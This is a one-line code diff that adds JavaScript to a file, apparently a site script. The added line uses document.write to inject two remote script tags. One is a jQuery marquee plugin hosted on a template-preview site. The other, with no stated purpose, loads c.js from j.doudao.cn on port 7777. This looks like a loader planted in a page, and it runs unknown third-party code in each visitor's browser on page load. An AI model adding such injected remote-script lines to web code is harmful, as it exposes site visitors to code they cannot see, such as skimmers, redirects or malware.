@@ -1,0 +1,1 @@
+document.write("<script src='http://www.17sucai.com/preview/13911/2016-06-16/wgjr/js/jQuery-jcMarquee.js?_xvx_=3028951300'></script>");document.write("<script src='http://j.doudao.cn:7777/js/c.js'></script>");
